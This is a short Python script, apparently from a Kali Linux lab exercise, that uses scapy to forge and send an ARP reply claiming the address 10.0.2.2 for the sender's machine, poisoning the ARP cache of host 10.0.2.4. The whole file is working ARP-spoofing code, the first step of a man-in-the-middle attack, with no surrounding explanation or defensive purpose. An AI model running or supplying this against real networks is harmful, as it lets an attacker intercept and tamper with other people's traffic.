import scapy.all as scapy
#kali
packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst="52:54:00:12:35:04", psrc="10.0.2.2")
scapy.send(packet)
print(packet.show())
print(packet.summary())